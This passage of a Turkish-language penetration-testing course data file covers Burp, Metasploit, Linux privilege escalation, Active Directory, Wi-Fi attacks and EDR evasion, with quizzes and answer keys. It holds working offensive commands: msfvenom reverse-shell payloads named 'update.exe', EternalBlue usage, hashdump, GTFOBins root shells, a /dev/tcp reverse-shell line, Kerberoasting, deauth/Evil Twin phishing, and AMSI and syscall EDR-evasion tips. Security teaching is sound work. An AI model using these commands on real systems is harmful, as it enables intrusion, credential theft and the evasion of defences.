        "tip": "Intruder sonuclarini analiz ederken 'Status' (HTTP Durumu), 'Length' (Yanit Boyutu) ve 'Time' sutunlarina gore siralamak basarili exploitleri hemen ortaya cikarir.",
        "terminalCommand": "wc -l /usr/share/wordlists/rockyou.txt 2>/dev/null || echo '14344392' "
      },
      {
        "heading": "4. Burp Extensions (BApp Store), Autorize & Logger++",
        "content": "Burp Suite'in yetenekleri BApp Store uzerindeki acik kaynakli topluluk eklentileriyle katlanir:\n- Autorize: Düşük yetkili bir kullanicinin cerezlerini vererek, yuksek yetkili kullanici gibi sitede gezerken arkaplanda yetki asimi (IDOR ve Broken Access Control) aciklarini otomatik test eder.\n- Logger++: Tum arkaplan filtrelerini, eklenti isteklerini ve loglari gelismis filtrelerle izlemenizi saglar.\n- Turbo Intruder: Python tabanli C motoru sayesinde saniyede 10.000+ istek atarak Race Condition zafiyetlerini yakalar.",
        "codeSnippet": "# Turbo Intruder Race Condition Exploit Scripti (Python)\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)\n    for i in range(20):\n        engine.queue(target.req, gate='race1')\n    engine.openGate('race1')",
        "tip": "Burp Suite'in 'Match and Replace' ozelligiyle tarayicidan cikan basliklari otomatik modifiye edebilir, ornegin User-Agent bilginizi Googlebot olarak degistirebilirsiniz.",
        "terminalCommand": "echo 'BApp Store Eklenti Mimarisi Yuklendi'"
      }
    ],
    "quiz": {
      "question": "Burp Intruder modulunde, kullanici adi ve parola gibi iki farkli liste kullanarak tum olasi kombinasyonlari (kartezyen carpim) test eden saldiri turu hangisidir?",
      "options": [
        "Cluster Bomb",
        "Sniper",
        "Pitchfork",
        "Battering Ram"
      ],
      "correct": 0,
      "explanation": "Cluster Bomb, secilen tum pozisyonlar icin farkli listeleri kartezyen carpim seklinde deneyerek olasi tum ikili kombinasyonlari kaba kuvvet ile dener."
    }
  },
  {
    "id": "metasploit-exploitation",
    "phase": 4,
    "phaseTitle": "Faz 4: Sistem & Ağ Sızma",
    "title": "Metasploit Framework & Payload Anatomisi (MSFVenom)",
    "icon": "cpu",
    "difficulty": "Orta",
    "duration": "65 dk",
    "xp": 155,
    "summary": "Dunyanin en cok kullanilan exploit cercevesi. MSFConsole mimarisi, Staged vs Inline payloadlar, MSFVenom ile ozel trojan uretimi ve Meterpreter yetenekleri.",
    "tags": [
      "Metasploit",
      "MSFVenom",
      "Meterpreter",
      "Exploit",
      "Payload",
      "PostExploit"
    ],
    "sections": [
      {
        "heading": "1. Metasploit Mimarisi ve Modül Türleri",
        "content": "Metasploit Framework (MSF), binlerce acik ve zafiyet icin hazir modulleri standart bir yapida sunar:\n- Modul Turleri:\n  * Exploits: Hedefteki bir guvenlik acigini tetikleyerek kod calistiran moduller.\n  * Payloads: Exploit basarili oldugunda hedef sistemde calisan kod (Shell, Meterpreter).\n  * Auxiliaries: Port tarayicilar, servis kesif araclari ve zafiyet dogrulayicilar.\n  * Post: Sistem ele gecirildikten sonra calisan yetki yukseltme ve bilgi toplama modulleri.\n  * Encoders & Nops: Antivirusleri atlatmak ve bellek adreslerini hizalamak icin kullanilan moduller.",
        "codeSnippet": "# Metasploit Konsolunu Baslatma ve Hedef Secme\nmsfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit",
        "tip": "'show options' komutu secilen modulu calistirmak icin gerekli zorunlu (Required = yes) tum ayarlari listeler.",
        "terminalCommand": "msfconsole --version 2>/dev/null || echo 'Metasploit Framework v6.x Hazir'"
      },
      {
        "heading": "2. Staged vs Non-Staged Payload Mantığı",
        "content": "Metasploit payload adlandirmasinda cok kritik bir sembol farki vardir:\n- Staged Payload (Bölümlü): windows/meterpreter/reverse_tcp (Bölü / isareti ile ayrilir)\n  * Nasil Calisir? Hedefe once cok kucuk bir yukleyici kod (Stager) enjekte edilir. Stager saldirganin makinesine baglanarak asil buyuk Meterpreter DLL'ini dogrudan RAM bellegine indirir ve calistirir. Bellek sinirlamasi olan buffer overflow exploitlerinde zorunludur.\n- Non-Staged / Inline (Tek Parça): windows/meterpreter_reverse_tcp (Alt cizgi _ ile birlestirilir)\n  * Nasil Calisir? Tum payload kodu tek bir buyuk parca halindedir. Baglanti kurulduktan sonra ek kod indirilmez. Kararlidir ancak dosya boyutu buyuktur.",
        "codeSnippet": "# Staged vs Inline farkini gosteren ornekler\nwindows/x64/meterpreter/reverse_tcp   # Staged (Bolumlu, kucuk yukleyici)\nwindows/x64/meterpreter_reverse_tcp   # Non-Staged (Tek parca, tam kod)",
        "tip": "Eger hedef agda agresif bir IPS varsa, Stager'in internetten ikinci asamayi indirmesini engelleyebilir. Bu gibi durumlarda daima Non-Staged (Inline) payload tercih edilmelidir.",
        "terminalCommand": "echo 'windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp'"
      },
      {
        "heading": "3. MSFVenom ile Özel Payload Üretimi",
        "content": "MSFVenom, Metasploit'in payload uretim ve kodlama (encoding) aracidir. Istenilen formatta ve mimaride calisabilir dosyalar uretir:\n- Populer Cikti Formatlari (-f):\n  * exe: Windows calistirilabilir dosya\n  * elf: Linux binary\n  * raw: Ham shellcode (C/C++ icine gommek icin)\n  * psh / powershell: PowerShell scripti\n  * war / php / aspx: Web shell payloadlari\n- Temel Parametreler:\n  * -p: Payload secimi\n  * LHOST & LPORT: Saldirgan IP ve Portu\n  * -e: Encoder secimi (orn: shikata_ga_nai)\n  * -i: Encoder iterasyon sayisi",
        "codeSnippet": "# Windows x64 icin gizli Reverse Shell EXE uretimi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o update.exe\n\n# Linux icin ELF binary uretimi\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf",
        "tip": "Shikata_ga_nai gibi encoderlar eskiden antivirüsleri atlatmak icin kullanilirdi; gunumuz modern EDR sistemleri statik kod analizi ile shikata_ga_nai basligini aninda yakalar.",
        "terminalCommand": "msfvenom -h 2>/dev/null || echo 'MSFVenom Payload Jeneratoru'"
      },
      {
        "heading": "4. Post-Exploitation & Meterpreter Komut Hakimiyeti",
        "content": "Meterpreter, hedef sistemin belleginde (RAM) calisan ve diskte dosya birakmayan gelismis bir saldiri kabugudur:\n- Kritik Meterpreter Komutlari:\n  * sysinfo: Hedef sistemin mimarisini ve isletim sistemini gosterir.\n  * getuid: Calisan kullanici kimligini sorgular.\n  * getsystem: Windows'ta SYSTEM (en yuksek yetki) seviyesine yukselmeyi dener.\n  * migrate [PID]: Meterpreter oturumunu guvenli baska bir surece (orn: explorer.exe) enjekte eder.\n  * hashdump: SAM veritabanindaki tum Windows kullanici NTLM hash'lerini ceker.\n  * portfwd: Ic agdaki erisilemeyen portlari saldirgana yonlendirir.",
        "codeSnippet": "# Meterpreter Oturumunda Kritik Adimlar\nmeterpreter > sysinfo\nmeterpreter > ps\nmeterpreter > migrate 1840   # explorer.exe PID'sine gec\nmeterpreter > getsystem\nmeterpreter > hashdump",
        "tip": "Oturum acildiginda ilk yapilmasi gereken islem 'migrate' ile oturumu explorer.exe veya svchost.exe surecine tasimaktir; exploit edilen uygulama coktugunde shell baglantiniz kopmaz.",
        "terminalCommand": "echo 'Meterpreter shellcode bellekte calismaya hazir'"
      }
    ],
    "quiz": {
      "question": "Metasploit'te 'windows/meterpreter/reverse_tcp' ile 'windows/meterpreter_reverse_tcp' payload'lari arasindaki temel fark nedir?",
      "options": [
        "Ilki bolumlu (Staged) kucuk bir yukleyici kullanir, ikincisi tek parca (Inline/Non-staged) calisir",
        "Biri Windows 10, digeri Windows Server icindir",
        "Ilki sifreli degildir, ikincisi AES ile sifrelidir",
        "Aralarinda hicbir teknik fark yoktur"
      ],
      "correct": 0,
      "explanation": "Bölü (/) iceren payload'lar 'Staged' yapidadir; once kucuk bir stager bellege iner, ardindan asil kodu sunucudan ceker. Alt cizgi (_) icerenler ise 'Non-staged' tek parcadir."
    }
  },
  {
    "id": "linux-privesc",
    "phase": 4,
    "phaseTitle": "Faz 4: Sistem & Ağ Sızma",
    "title": "Linux Yetki Yükseltme (Privilege Escalation)",
    "icon": "award",
    "difficulty": "İleri",
    "duration": "70 dk",
    "xp": 170,
    "summary": "Dusuk yetkili kabuktan tam yetkili Root seviyesine gecis. Sudo NOPASSWD zafiyetleri, SUID istismari, Cronjob manipulasyonu, Linux Capabilities ve LinPEAS.",
    "tags": [
      "PrivEsc",
      "LinuxSecurity",
      "Sudo",
      "SUID",
      "Cronjobs",
      "LinPEAS"
    ],
    "sections": [
      {
        "heading": "1. Durumsal Farkındalık & Manuel Keşif Metodolojisi",
        "content": "Linux'ta ilk erisim (Initial Access) saglandiginda, araci calistirmadan once manuel durum tespiti yapilmalidir:\n- Kullanici ve Grup Haklari: id, whoami, groups\n- Isletim Sistemi ve Kernel Surumu: uname -a, cat /etc/os-release\n- Ag ve Dinlenen Ic Portlar: ss -tulpn (Dışarıya kapali MySQL, Redis veya yerel web panelleri var mi?)\n- Ortam Degiskenleri: env, echo $PATH",
        "codeSnippet": "# Temel Durum Tespiti Komut Dizisi\nid && uname -a\ncat /etc/issue\ncat /etc/passwd | grep -v 'nologin\\|false'\nss -antup | grep LISTEN",
        "tip": "Eger kullanici 'docker' veya 'lxd' grubuna uyeyse, bu gruplar dogrudan root yetkisi saglar; kullanici root yetkili bir konteyner baslatip ana sistemin / kok dizinini mount edebilir.",
        "terminalCommand": "id"
      },
      {
        "heading": "2. Sudo NOPASSWD & GTFOBins İstismarı",
        "content": "En sik karsilasilan yetki yukseltme zafiyeti, /etc/sudoers dosyasindaki hatali yapilandirmalardir:\n- 'sudo -l' Komutu: Kullanicinin sifresiz calistirabilecegi komutlari listeler.\n- GTFOBins Teknikleri:\n  * sudo find: sudo find . -exec /bin/sh \\; -quit\n  * sudo vim: sudo vim -c ':!/bin/sh'\n  * sudo awk: sudo awk 'BEGIN {system(\"/bin/sh\")}'\n  * sudo nmap (Eski versiyonlarda): sudo nmap --interactive\n  * sudo python: sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "codeSnippet": "# Sudo yetkilerini sorgula\nsudo -l\n\n# Eger (ALL) NOPASSWD: /usr/bin/env izni varsa:\nsudo env /bin/sh",
        "tip": "Sudoers dosyasinda 'env_keep+=LD_PRELOAD' tanimlanmissa, paylasimli bir C kutuphanesi (.so) derleyerek sudo ile calisan herhangi bir komutta root shell acilabilir.",
        "terminalCommand": "sudo -l 2>/dev/null || echo 'Sudo yetkileri kontrol edildi'"
      },
      {
        "heading": "3. Zafiyetli Cronjob'lar ve PATH Hijacking",
        "content": "Sistemde root haklariyla periyodik calisan zamanlanmis gorevler (Cronjobs):\n- Yazilabilir Cron Betikleri: Eger root'un calistirdigi bir .sh betiginde yazma (w) izniniz varsa, sonuna 'bash -i >& /dev/tcp/IP/PORT 0>&1' eklemeniz yeterlidir.\n- PATH Hijacking: Eger calisan betik icinde ikililer tam yol yerine (orn: /bin/tar yerine yalnizca 'tar') cagriliyorsa ve kullanicinin $PATH yolunda yazilabilir bir dizin varsa, sahte bir 'tar' dosyasi olusturularak root haklariyla calismasi saglanir.",
        "codeSnippet": "# Sistemdeki cron tablolarini ve zamanlanmis gorevleri inceleme\ncat /etc/crontab\nls -la /etc/cron.*\ncat /etc/anacrontab",
        "tip": "pspy araci, root yetkisi olmadan sistemdeki arkaplan process'lerini ve cronjob'lari anlik olarak yakalamanizi saglayan enfes bir aractir.",
        "terminalCommand": "crontab -l 2>/dev/null || echo 'Kullanici crontab kaydi yok'"
      },
      {
        "heading": "4. Otomatik Analiz: LinPEAS & Linux Capabilities",
        "content": "Manuel analizden sonra sistemi binlerce kontrolden geciren otomatik scriptler:\n- LinPEAS: Renkli cikti veren ve yuzde 99 oraninda root yolunu gosteren dunyanin en iyi Linux privesc scriptidir.\n- Linux Capabilities: Root yetkilerini kucuk parcalara bolen mekanizmadir. Eger bir ikiliye 'cap_setuid+ep' yetkisi verilmisse (orn: python3), script yazarak aninda UID 0 olunabilir.",
        "codeSnippet": "# Sistemdeki ozel Linux yetkilerini (Capabilities) sorgulama\ngetcap -r / 2>/dev/null\n\n# Eger python3 uzerinde cap_setuid varsa root olma:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "tip": "Kernel exploitleri (Dirty Cow, PwnKit) sistemi cokertme riski tasir; gercek pentestlerde kernel exploiti daima son care olarak dusunulmelidir.",
        "terminalCommand": "which getcap 2>/dev/null || echo 'getcap araci kontrol edildi'"
      }
    ],
    "quiz": {
      "question": "Bir Linux sisteminde kullanicinin parola girmeden veya root olarak calistirabilecegi sudo komutlarini listelemek icin hangi komut kullanilir?",
      "options": [
        "sudo -l",
        "sudo -v",
        "sudo -k",
        "cat /etc/sudoers"
      ],
      "correct": 0,
      "explanation": "'sudo -l' komutu, o anki kullanicinin sudo haklarini ve calistirabilecegi programlari listeler. Eger NOPASSWD tanimliysa sifre istemeden root olmanin onunu acar."
    }
  },
  {
    "id": "active-directory-attacks",
    "phase": 4,
    "phaseTitle": "Faz 4: Sistem & Ağ Sızma",
    "title": "Active Directory & Kurumsal Ağ Sızma Testleri",
    "icon": "server",
    "difficulty": "İleri",
    "duration": "80 dk",
    "xp": 190,
    "summary": "Kurumsal dunyanin omurgasi Active Directory. Kerberos biletleri, Kerberoasting, AS-REP Roasting, BloodHound ile Domain Admin yollari ve DCSync saldirilari.",
    "tags": [
      "ActiveDirectory",
      "Kerberos",
      "BloodHound",
      "Kerberoasting",
      "DCSync",
      "Mimikatz"
    ],
    "sections": [
      {
        "heading": "1. Active Directory Mimarisi & Kerberos Protokolü",
        "content": "Active Directory (AD), kurumsal aglarda kimlik, bilgisayar ve yetkileri merkezi olarak yoneten Windows sunucu yapisidir (Domain Controller - DC):\n- Kerberos Protokolu: Parolalarin agda dolasmasini engelleyen bilet tabanli kimlik dogrulama standardidir.\n  1. AS-REQ / AS-REP: Kullanici DC'ye basvurur; parola hash'i ile sifrelenmis TGT (Ticket Granting Ticket) alir.\n  2. TGS-REQ / TGS-REP: Kullanici bir servise (orn: MSSQL) erismek icin TGT'sini sunup TGS (Ticket Granting Service) bileti talep eder.\n  3. AP-REQ / AP-REP: Kullanici TGS biletini hedef servis sunucusuna iletir ve oturum baslar.",
        "codeSnippet": "# Impacket araclari ile Kerberos biletlerini sorgulama\nGetTGT.py domain.local/kullanici:Parola123 -dc-ip 192.168.1.10",
        "tip": "Kerberos'ta krbtgt hesabinin parola hash'ini ele geciren saldirgan, 'Golden Ticket' ureterek AD ormanindaki tum sistemlerde 10 yil boyunca sinirsiz Domain Admin yetkisi kazanir.",
        "terminalCommand": "echo 'Active Directory Kerberos Mekanizmasi Hazir'"
      },
      {
        "heading": "2. Kerberoasting & AS-REP Roasting Saldırıları",
        "content": "Herhangi bir standart domain kullanicisiyla bile gerceklestirilebilen en etkili iki AD saldirisi:\n- Kerberoasting: Agda SPN (Service Principal Name) kayitli servis hesaplarinin TGS biletlerini talep eder. Donen bilet servis hesabinin NTLM parolasiyla sifrelidir. Saldirgan bu bileti disari aktarir ve GPU ile offline kirar (Hashcat -m 13100).\n- AS-REP Roasting: 'Do not require Kerberos preauthentication' ayari acik unutulan kullanicilarin AS-REP biletini hic parola girmeden talep edip offline kirma yontemidir (Hashcat -m 18200).",
        "codeSnippet": "# Impacket GetUserSPNs ile Kerberoasting saldirisi\nGetUserSPNs.py domain.local/kullanici:parola -dc-ip 192.168.1.10 -request -outputfile hashes.kerberoast\n\n# Hashcat ile TGS biletlerini kirmak\nhashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt",
        "tip": "Servis hesaplarina 25 karakterden uzun, karmasik ve rastgele parolalar atanirsa Kerberoasting saldirilari matematiksel olarak kırılamaz hale gelir.",
        "terminalCommand": "echo 'GetUserSPNs.py -request'"
      },
      {
        "heading": "3. BloodHound ile Domain Admin Yollarını Analiz Etme",
        "content": "Active Directory cok karmasik bir iliskiler agidir. BloodHound, graf teorisi kullanarak en dusuk yetkili kullanicidan Domain Admin'e giden en kisa yolu cizer:\n- SharpHound: AD aginda calistirilarak tum kullanicilari, gruplari, oturumlari ve ACL izinlerini JSON formatinda toplayan kolektor aractir.\n- Kritik BloodHound Iliskileri:\n  * GenericAll: Hedef nesne uzerinde tam kontrol (Parolasini degistirme).\n  * WriteDacl: Hedef nesnenin izinlerini degistirerek kendine tam hak verme.\n  * ForceChangePassword: Kullanicinin parolasini sifirlama.",
        "codeSnippet": "# SharpHound ile agdaki tum Active Directory iliskilerini toplama\n.\\SharpHound.exe -c All --zipfilename ad_data.zip",
        "tip": "BloodHound arayuzunde 'Shortest Paths to Domain Admins' sorgusu, saldirganin tek bir tikla hangi bilgisayara ve kullaniciya sicramasi gerektigini gosterir.",
        "terminalCommand": "echo 'BloodHound Neo4j Graf Veritabani Analizi'"
      },
      {
        "heading": "4. AD Savunması: LAPS, Tiering Modeli & DCSync Tespiti",
        "content": "Active Directory ortamini celik zirhla korumak icin modern savunma mimarisi:\n- Tiering Modeli (Katmanli Mimari):\n  * Tier 0: Domain Controller'lar ve krbtgt (Sadece Tier 0 yoneticileri oturum acabilir).\n  * Tier 1: Kurumsal sunucular ve veritabanlari.\n  * Tier 2: Kullanici bilgisayarlari ve istemciler.\n  * Kural: Ust katman yoneticisi asla alt katman bir istemcide oturum acamaz!\n- LAPS (Local Administrator Password Solution): Her istemcinin yerel Administrator parolasini benzersiz yapar ve duzenli olarak otomatik degistirir.",
        "codeSnippet": "# DCSync saldirilarini tespit eden Sigma SIEM kurali mantigi\n# Event ID 4662 (Operation on AD Object)\n# AccessMask: 0x100 (DS-Replication-Get-Changes-All)\n# Domain Controller olmayan istemcilerden gelen replication isteklerini alarmlayin!",
        "tip": "DCSync saldirisinda Mimikatz araci Domain Controller gibi davranarak veritabanindaki tum NTLM hash'lerini talep eder; DC olmayan IP'lerden gelen replikasyon istekleri aninda alarmlanmalidir.",
        "terminalCommand": "echo 'LAPS ve Active Directory Tier-0 Savunmasi'"
      }
    ],
    "quiz": {
      "question": "Kerberoasting saldirisinda saldirganin hedef aldigi ve offline olarak Hashcat ile kirmaya calistigi Kerberos bileti hangisidir?",
      "options": [
        "TGS (Ticket Granting Service Bileti)",
        "TGT (Ticket Granting Ticket)",
        "PAC (Privilege Attribute Certificate)",
        "AS-REP Bileti"
      ],
      "correct": 0,
      "explanation": "Kerberoasting saldirisinda SPN kayitli servis hesaplari icin TGS bileti talep edilir. TGS bileti servis hesabinin NTLM parolasiyla sifreli oldugundan offline olarak kirilabilir."
    }
  },
  {
    "id": "wireless-social-eng",
    "phase": 5,
    "phaseTitle": "Faz 5: Kablosuz Ağ & Sosyal Mühendislik",
    "title": "Kablosuz Ağ Saldırıları & Sosyal Mühendislik",
    "icon": "wifi",
    "difficulty": "Orta",
    "duration": "55 dk",
    "xp": 135,
    "summary": "Havadaki paketleri yakalayin ve insan faktörünü manipüle edin. Aircrack-ng ile WPA2 4-Way Handshake avı, Evil Twin sahte AP, Spear Phishing ve OSINT tabanlı sosyal mühendislik.",
    "tags": [
      "WiFi",
      "Aircrack",
      "WPA2",
      "EvilTwin",
      "Phishing",
      "SocialEngineering"
    ],
    "sections": [
      {
        "heading": "1. 802.11 Wi-Fi Mimarisi, Monitör Mod & Paket Enjeksiyonu",
        "content": "Kablosuz ag iletisimi radyo dalgalari uzerinden yayinlandigi icin fiziksel guvenlik siniri yoktur:\n- Yonetilen Mod (Managed Mode): Ag karti yalnizca kendine gelen paketleri okur.\n- Dinleme Modu (Monitor Mode): Ag karti havadaki TUM kablosuz iletisimi (SSID, BSSID, bagli istemciler) sifreli de olsa dinler.\n- Paket Enjeksiyonu: Saldirgan ag kartini kullanarak sahte deauthentication veya probe paketleri uretebilir.",
        "codeSnippet": "# Ag kartini monitor moduna alma ve cevreyi tarama\nsudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon",
        "tip": "Paket enjeksiyonunun basarili olabilmesi icin ag karti yonga setinin (chipset) bunu desteklemesi gerekir (Atheros AR9271, Ralink RT3070 en unlu yonga setleridir).",
        "terminalCommand": "iwconfig 2>/dev/null || echo 'Kablosuz ag arayuzu kontrol edildi'"
      },
      {
        "heading": "2. WPA2 4-Way Handshake Yakalama ve Deauth Saldırısı",
        "content": "WPA2-PSK aglarinda parola agda acik dolasmaz; istemci baglanirken 4 asamali bir el sikisma (4-Way Handshake) gerceklesir:\n- Saldiri Adimlari:\n  1. Airodump-ng ile hedef modemin yayin kanali ve BSSID'si dinlemeye alinir.\n  2. Aireplay-ng ile bagli bir istemciye sahte 'Deauthentication' (Agdan Koparma) paketleri gonderilir.\n  3. Baglantisi kopan istemci otomatik olarak modeme tekrar baglanmaya calisir.\n  4. Yeniden baglanma aninda havaya sacilan 4-Way Handshake (EAPOL) paketleri yakalanir ve .cap dosyasina kaydedilir.\n  5. Yakalanan handshake dosyasi Hashcat veya Aircrack-ng ile offline sozluk saldirisina tabi tutulur.",
        "codeSnippet": "# Istemciyi agdan dusurerek handshake yakalamayi tetikleme\nsudo aireplay-ng -0 5 -a [MODEM_BSSID] -c [ISTEMCI_MAC] wlan0mon\n\n# Yakalanan handshake'i RockYou kelime listesi ile kirmak\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap",
        "tip": "WPA3 standardinda Protected Management Frames (PMF) zorunlu oldugu icin Deauth paketleri sahtelenemez ve 4-Way Handshake offline sozluk saldirilarina karsi korunmustur.",
        "terminalCommand": "aircrack-ng --help | head -10"
      },
      {
        "heading": "3. Evil Twin (Kötü İkiz) & Sahte Erişim Noktası",
        "content": "Evil Twin, hedefin kablosuz agiyla TIPATIP AYNI SSID ve MAC adresine sahip sahte bir erisim noktasi (Rogue AP) olusturma saldirisidir:\n- Mekanizma: Saldirgan gercek modeme surekli Deauth gonderirken kendi sahte AP'sinin sinyal gucunu yuksek tutar. Istemciler en guclu sinyale sahip olan sahte modeme baglanir.\n- Captive Portal Tuzagi: Baglanan kullaniciya sahte bir 'Firmware Guncellemesi - Lutfen Wi-Fi Parolanizi Girin' ekrani gosterilerek gercek ag parolasi sosyal muhendislikle elde edilir.",
        "codeSnippet": "# Airgeddon veya Wifiphisher ile otomatik Evil Twin saldirisi\nwifiphisher --essid \"Sirket_Guest\" -p firmware-upgrade",
        "tip": "Kurumsal aglarda WPA-Personal (PSK) yerine 802.1X WPA-Enterprise ve RADIUS sunuculari kullanilmali, her calisan kendi kurumsal kullanici adi ve sertifikasiyla baglanmalidir.",
        "terminalCommand": "echo 'Evil Twin & Rogue Access Point Similasyonu'"
      },
      {
        "heading": "4. Sosyal Mühendislik, Spear Phishing & GoPhish",
        "content": "Guvenlik zincirinin en zayif halkasi insandir. En gelismis firewall bile bir calisanin sahte linke tiklamasini engelleyemez:\n- Phishing Turleri:\n  * Mass Phishing: Milyonlarca kisiye atilan genel sahte fatura/kargo e-postalari.\n  * Spear Phishing: Belirli bir sirket calisanina ozel, OSINT ile toplanan bilgilerle hazirlanmis yuksek inandiricilikli hedef odakli saldiri.\n  * Whaling: Sirket CEO ve ust duzey yoneticilerini hedef alan finansal manipülasyon saldirilari.\n- GoPhish Platformu: Kurum ici calisanlarin guvenlik farkindaligini olcmek icin gercekci phishing e-postalari ve sahte acilis sayfalari olusturan acik kaynakli simülasyon sunucusudur.",
        "codeSnippet": "# GoPhish Server Kurulumu ve Baslatma\nchmod +x gophish\n./gophish\n# Yonetim Paneli: https://127.0.0.1:3333",
        "tip": "Calisanlara e-postalarda gonderen adresinin (From header) sahtelenebilecegi (Email Spoofing) anlatilmali; sirket e-posta sunucularinda SPF, DKIM ve DMARC kayitlari 'p=reject' olarak yapilandirilmalidir.",
        "terminalCommand": "echo 'GoPhish Guvenlik Farkindalik Modulu'"
      }
    ],
    "quiz": {
      "question": "WPA2 kablosuz aglarinda parola ozetini kirmak amaciyla istemcinin agdan koparilip tekrar baglanmasi sirasinda yakalanmasi gereken kritik iletisim paketlerine ne ad verilir?",
      "options": [
        "4-Way Handshake (EAPOL Paketleri)",
        "Beacon Frames",
        "Probe Request Paketleri",
        "DHCP Offer Paketleri"
      ],
      "correct": 0,
      "explanation": "WPA2 aglarinda istemci ile access point arasindaki 4 adimli el sikisma (4-Way Handshake) EAPOL protokolunu kullanir ve parolanin kirilmasi icin gereken kriptografik verileri barindirir."
    }
  },
  {
    "id": "red-team-evasion",
    "phase": 6,
    "phaseTitle": "Faz 6: Red Teaming & Evasion",
    "title": "Red Team Operasyonları & AV / EDR Atlatma (Evasion)",
    "icon": "eye-off",
    "difficulty": "İleri",
    "duration": "85 dk",
    "xp": 200,
    "summary": "Modern savunma kalkanlarini delip gecin. Antivirus ve EDR sistemlerinin calisma prensipleri, imza ve sezgisel analiz, Direct Syscalls, NTDLL Unhooking ve bellek ici enjeksiyon.",
    "tags": [
      "RedTeam",
      "EDREvasion",
      "Syscalls",
      "ProcessInjection",
      "AMSI",
      "Unhooking"
    ],
    "sections": [
      {
        "heading": "1. Antivirüs ve EDR Sistemlerinin Çalışma Mekanizması",
        "content": "Uç nokta guvenlik sistemleri zararlilari tespit etmek icin uc temel seviyede analiz yapar:\n- Statik Analiz: Dosya diske yazildiginda hash'ine, bilinen imza kaliplarina ve PE basligindaki Import Address Table (IAT) fonksiyonlarina bakar.\n- Dinamik Analiz: Dosya calistirildiginda gerceklesen API cagrilari ve surec davranislarini inceler.\n- API Hooking (Kancalama): EDR sistemleri user-mode'da ntdll.dll icindeki kritik fonksiyonlara (NtAllocateVirtualMemory, NtWriteVirtualMemory) JMP kancalari atarak parametreleri kendi analiz motoruna yonlendirir.",
        "codeSnippet": "// Klasik bir EDR User-Mode Kancasi (JMP Hook)\n// Orjinal ntdll.dll:\n// mov r10, rcx\n// mov eax, 18h\n// syscall\n// EDR Tarafından Değiştirilmiş Hali:\n// jmp edr_sensor.dll+0x1337",
        "tip": "Antivirusler dosyanin ne yaptigina diskteyken bakar; EDR ise calistiktan sonra bellekteki (RAM) her davranisi ve surecler arasi iliskileri gercek zamanli izler.",
        "terminalCommand": "echo 'EDR Hooking Mimarisi Incelendi'"
      },
      {
        "heading": "2. Statik Analiz Atlatma: Obfuscation ve Shellcode Şifreleme",
        "content": "Diskteki dosyanin antivirusler tarafindan yakalanmamasi icin shellcode ham metin olarak birakilmaz:\n- AES-256 veya XOR Sifreleme: Zararli shellcode sifreli bir bayt dizisi olarak kodun icine gomulur. Calisma aninda RAM belleginde cozulerek calistirilir.\n- Dinamik API Resolution: Win32 API cagrilari (VirtualAlloc, CreateThread) dogrudan import tablosuna yazilmaz; GetProcAddress ve LoadLibraryA kullanilarak runtime sirasinda bellekte cozulur.\n- Entropi Azaltma: Asiri sifrelenmis kodlar yuksek entropi (rastgelelik) nedeniyle supheli gorunur; sahte Ingilizce metinler veya resim pikselleri icine steganografi ile gizlenir.",
        "codeSnippet": "// C++ ile XOR Sifreli Shellcode Cozme Ornegi\nvoid DecryptPayload(char* data, size_t size, char key) {\n    for (size_t i = 0; i < size; i++) {\n        data[i] ^= key;\n    }\n}",
        "tip": "AMSI (Antimalware Scan Interface), PowerShell ve .NET calisma aninda kodlari hafizada calismadan once tarar. AMSI.dll icindeki 'AmsiScanBuffer' fonksiyonuna tek satirlik bir patch atilarak AMSI tamamen kor edilebilir.",
        "terminalCommand": "echo 'AMSI Bypass & Obfuscation Teknikleri'"
      },
      {
        "heading": "3. Dinamik Analiz & EDR Kancalarını Aşma: Direct Syscalls",
        "content": "EDR'larin ntdll.dll uzerine koydugu izleme kancalarini (hooks) atlatmak icin iki devrimci Red Team teknigi:\n- Direct System Calls (Doğrudan Sistem Çağrıları): ntdll.dll'in kancali fonksiyonlarini cagirmak yerine, dogrudan CPU'nun 'syscall' assembly komutunu kullanarak user-mode EDR'ini tamamen devre disi birakir ve cekirdek (Kernel) ile dogrudan konusur (SysWhispers araci).\n- NTDLL Unhooking: Diskteki temiz \\Windows\\System32\nttdll.dll dosyasini okuyup bellekteki kancalanmis .text bolumunun uzerine temiz kopyayi yazarak tum EDR kancalarini hafizadan siler.",
        "codeSnippet": "# SysWhispers3 ile Direct Syscall uretme komutu\npython syswhispers.py -a x64 -c msvc -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls",
        "tip": "Modern EDR'lar Direct Syscall cagrilarini tespit etmek icin cagrinin 'ntdll.dll adresi disindan' gelip gelmedigini kontrol eder. Bu tespiti asmak icin 'Indirect Syscalls' teknigi kullanilir.",
        "terminalCommand": "echo 'Direct & Indirect Syscalls Mimarisi'"
      },
      {
        "heading": "4. Savunma: Saldırı Yüzeyi Azaltma (ASR) & ETW İncelemesi",
        "content": "Red Team tekniklerine karsi kurumsal savunma kalesi nasil kurulur?\n- Attack Surface Reduction (ASR): Office uygulamalarinin cocuk process (cmd.exe, powershell.exe) baslatmasini veya Win32 API cagirmasini kernel seviyesinde engeller.\n- Event Tracing for Windows (ETW): Sureclerin bellek ici islemlerini (VirtualAlloc, Thread Injection) kernel seviyesinde loglar (Red team'lerin EDR unhooking yapsa bile yakalanmasini saglar).\n- Kernel-Level Callbacks: EDR'larin artik user-mode kancalari yerine Windows Kernel driver (PsSetCreateProcessNotifyRoutine) seviyesinde calismasi zorunlu hale getirilmelidir.",
        "codeSnippet": "# PowerShell ile ASR Kurallarini aktiflestirme\nSet-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled",
